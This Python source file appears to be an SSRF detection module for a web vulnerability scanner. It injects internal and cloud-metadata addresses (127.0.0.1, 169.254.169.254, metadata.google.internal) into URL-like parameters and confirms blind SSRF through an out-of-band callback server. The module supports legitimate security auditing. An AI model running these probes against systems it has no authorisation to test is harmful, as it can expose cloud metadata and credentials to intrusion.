import asyncio
import aiohttp
import time
from hellhound.core import oob_utils

NAME = "ssrf_detector"
CATEGORY = "vuln"
DESCRIPTION = "Blind & Out-of-Band (OOB) SSRF Auditor"

OPTIONS = [
    {"name": "timeout", "type": int, "default": 10, "help": "Request timeout (seconds)"},
    {"name": "concurrency", "type": int, "default": 5, "help": "Concurrent attack threads"},
    {"name": "internal_probing", "type": bool, "default": True, "help": "Probe common internal metadata services"},
]

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

INTERNAL_TARGETS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://169.254.169.254/latest/meta-data/",      # AWS/OpenStack
    "http://metadata.google.internal/computeMetadata/v1/", # Google Cloud
    "http://10.0.0.1",
    "http://192.168.1.1",
]

class SSRFAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options
        self.oob_url = oob_utils.resolve_oob_url(options)

    async def check_ssrf(self, url, method, pname):
        """Checks for SSRF using internal targets and OOB triggers."""
        findings = []
        
        # 1. Internal Probing (Time-based or length variation)
        if self.options.get("internal_probing"):
            for internal in INTERNAL_TARGETS:
                try:
                    async with self.session.request(method, url, params={pname: internal}, timeout=self.options.get("timeout")) as r:
                        body = await r.text()
                        # Basic heuristics: status 200 or specific metadata strings
                        if r.status == 200 and ("AMI" in body or "instance-id" in body or "computeMetadata" in body):
                            findings.append({
                                "url": url,
                                "parameter": pname,
                                "type": "INTERNAL_SSRF",
                                "severity": "CRITICAL",
                                "evidence": f"Successfully accessed internal metadata via {pname} -> {internal}"
                            })
                except:
                    continue

        # 2. OOB Triggers
        if self.oob_url:
            token = f"ssrf-{int(time.time())}"
            oob_target = f"{self.oob_url}/{token}"
            try:
                async with self.session.request(method, url, params={pname: oob_target}) as r:
                    await r.read()
                
                # Poll OOB server
                oob_server = self.options.get("oob_server")
                if oob_server:
                    hit, data = oob_server.poll(token, timeout=5)
                    if hit:
                        findings.append({
                            "url": url,
                            "parameter": pname,
                            "type": "OOB_SSRF",
                            "severity": "HIGH",
                            "evidence": f"Confirmed OOB callback from target! Hits: {data}"
                        })
            except:
                pass

        return findings

async def run(target, emit, options=None):
    emit.info(f"[*] SSRF_DETECTOR: Auditing for Blind & OOB SSRF on {target}")
    
    oob_url = oob_utils.resolve_oob_url(options)
    if not oob_url:
        emit.info("    [i] No OOB server active. Blind SSRF detection will be limited to internal metadata probes.")

    # Prioritize params flagged as SSRF_POTENTIAL
    hydra_intel = options.get("hydra_intel", {}) if options else {}
    surfaces = [s for s in hydra_intel.get("surfaces", []) if "SSRF_POTENTIAL" in s.get("roles", [])]
    
    if not surfaces:
        spider_intel = options.get("spider_intel", {}) if options else {}
        for ep in spider_intel.get("endpoints", []):
            for p_items in ep.get("params", {}).values():
                for p in p_items:
                    # Look for parameters implying URLs
                    if any(x in p.lower() for x in ["url", "uri", "path", "dest", "redirect", "file", "page", "proxy"]):
                        surfaces.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})

    if not surfaces:
        emit.warn("[!] No suitable injection surfaces identified for SSRF testing.")
        return {"raw": "No targets", "signals": []}

    emit.info(f"    [i] Auditing {len(surfaces)} potential SSRF surface(s)...")

    findings = []
    async with aiohttp.ClientSession() as session:
        auditor = SSRFAuditor(emit, session, options or {})
        for s in surfaces:
            res = await auditor.check_ssrf(s["url"], s["method"], s["parameter"])
            if res:
                findings.extend(res)
                for f in res:
                    emit.warn(f"        [!] SSRF FOUND: {f['url']} via {f['parameter']} ({f['type']})")

    if findings:
        emit.success(f"[+] SSRF_DETECTOR complete. Found {len(findings)} confirmed SSRF vulnerabilities!")
    else:
        emit.info("[-] No SSRF vulnerabilities detected.")

    return {
        "raw": f"Audited {len(surfaces)} surfaces. Found {len(findings)} SSRF.",
        "intel": {
            "vulnerabilities": findings
        },
        "signals": ["SSRF_FOUND" if findings else "NO_SSRF"]
    }
